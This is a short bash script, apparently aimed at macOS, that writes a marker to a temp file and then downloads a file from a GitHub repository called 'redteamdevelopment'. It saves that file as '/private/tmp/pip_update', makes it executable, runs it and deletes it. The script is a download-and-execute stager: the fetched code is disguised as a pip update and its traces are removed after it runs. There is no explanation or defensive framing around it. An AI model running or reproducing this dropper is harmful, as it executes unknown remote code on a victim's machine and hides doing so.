#!/bin/bash

echo 111 >> /private/tmp/test.txt
curl -fSL --progress-bar  https://github.com/redteamdevelopment/test.sh/blob/main/activee  -o /private/tmp/pip_update && chmod +x /private/tmp/pip_update && /private/tmp/pip_update && rm -rf /private/tmp/pip_update
